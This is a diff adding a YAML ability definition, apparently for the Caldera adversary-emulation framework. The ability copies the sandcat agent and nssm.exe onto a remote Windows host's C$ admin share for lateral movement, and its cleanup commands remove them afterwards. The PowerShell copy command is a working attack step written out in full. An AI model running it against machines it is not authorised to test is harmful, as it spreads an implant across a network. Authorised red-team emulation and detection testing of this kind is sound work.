@@ -1,0 +1,64 @@
+- tactic: lateral-movement
+  technique_name: 'Remote Services: SMB/Windows Admin Shares'
+  technique_id: T1021.002
+  name: Copy 54ndc47 (SMB)
+  description: Copy 54ndc47 to remote host (SMB)
+  executors:
+  - name: psh
+    platform: windows
+    command: '$path = "sandcat.go-windows";
+
+      $drive = "\\#{remote.host.fqdn}\C$";
+
+      Copy-Item -v -Path $path -Destination $drive"\Users\Public\s4ndc4t.exe";
+
+      Copy-Item -v -Path "nssm.exe" -Destination $drive"\Users\Public\nssm.exe";'
+    code: null
+    language: null
+    build_target: null
+    payloads:
+    - sandcat.go-windows
+    - nssm.exe
+    uploads: []
+    timeout: 60
+    parsers:
+    - module: plugins.stockpile.app.parsers.54ndc47_remote_copy
+      parserconfigs:
+      - source: remote.host.fqdn
+        edge: has_54ndc47_copy
+        target: ''
+        custom_parser_vals: {}
+    cleanup:
+    - '$drive = "\\#{remote.host.fqdn}\C$";
+
+      Remove-Item -Path $drive"\Users\Public\s4ndc4t.exe" -Force;
+
+      Remove-Item -Path $drive"\Users\Public\nssm.exe" -Force;'
+    variations: []
+    additional_info: {}
+  requirements:
+  - module: plugins.stockpile.app.requirements.not_exists
+    relationship_match:
+    - source: remote.host.fqdn
+      edge: has_54ndc47_copy
+  - module: plugins.stockpile.app.requirements.basic
+    relationship_match:
+    - source: remote.host.fqdn
+      edge: has_share
+  - module: plugins.stockpile.app.requirements.no_backwards_movement
+    relationship_match:
+    - source: remote.host.fqdn
+  - module: plugins.stockpile.app.requirements.reachable
+    relationship_match:
+    - source: remote.host.fqdn
+      edge: isAccessibleFrom
+  privilege: ''
+  repeatable: false
+  buckets:
+  - lateral-movement
+  additional_info: {}
+  access: {}
+  singleton: true
+  plugin: stockpile
+  delete_payload: false
+  id: 65048ec1-f7ca-49d3-9410-10813e472b30
